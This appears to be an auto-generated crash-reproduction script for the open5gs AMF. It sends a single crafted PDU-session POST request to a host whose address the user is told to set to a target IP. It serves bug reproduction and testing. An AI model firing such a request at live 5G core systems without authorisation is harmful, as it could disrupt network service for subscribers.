#!/usr/bin/env python3
# Crash reproduction for open5gs-amf (info)
# Detected: Sat May  9 03:37:13 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'POST'
path = '/nsmf-pdusession/v1/pdu-sessions/1/modify'
body = b'{"supi": "imsi-901700000000001", "dnn": "internet", "sNssai": {"sst": 1, "sd": "010203"}, "pduSessionId": 1, "pduSessionType": "IPV4", "sscMode": "SSC_MODE_1"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
